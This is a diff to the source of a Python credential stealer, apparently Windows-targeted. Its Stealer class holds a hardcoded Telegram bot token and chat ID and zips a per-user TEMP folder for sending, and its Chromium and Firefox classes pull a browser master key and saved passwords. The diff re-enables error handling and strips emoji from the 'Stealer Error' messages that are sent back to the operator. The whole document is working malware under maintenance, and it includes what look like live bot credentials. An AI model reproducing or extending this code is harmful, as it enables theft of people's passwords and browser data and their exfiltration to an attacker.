@@ -15,7 +15,7 @@ import requests
 from zipfile import ZipFile
 class Stealer():
 	def __init__(self):
-		#try:
+		try:
 			self.token = "5226296304:AAFALU7Us4WnjEx4RbJsV1U3ZyhGiKYxKFo"
 			self.chat_id = "5176730926"
 			self.result = {}
@@ -27,8 +27,8 @@ class Stealer():
 			self.Save(self.result)
 			self.SendMessage("%F0%9F%93%8C Sending File...")
 			self.Zip_Folder()
-		#except:
-		#	self.SendMessage("✖️ Stealer Error : \n ❖ Message : " + traceback.format_exc())
+		except:
+			self.SendMessage(" Stealer Error : \n  Message : " + traceback.format_exc())
 	def Zip_Folder(self):
 		dirname = os.environ['TEMP'] + "\\" + os.environ['USERNAME'] + "\\"
 		output = os.environ['TEMP'] + "\\" + os.environ['USERNAME'] + '.zip'
@@ -298,7 +298,7 @@ class Chromium():
 					return master_key
 				except:
 					pass
-		#self.main_self.SendMessage("✖️ Stealer Error : \n ❖ Failed Enumerate Master Key : " + dir)
+		#self.main_self.SendMessage(" Stealer Error : \n  Failed Enumerate Master Key : " + dir)
 		return None
 class Firefox():
 	def __init__(self, main_self):
@@ -372,7 +372,7 @@ class Firefox():
 							self.json[browser] = {}
 						self.json[browser].update({'Passwords' : result})
 		except Exception as ex:
-			self.main_self.SendMessage("✖️ Stealer Error : \n ❖ " + str(ex))
+			self.main_self.SendMessage(" Stealer Error : \n  " + str(ex))
 	def Enumerate_Profiles(self, folder):
 		profiles = []
 		if os.path.exists(folder):
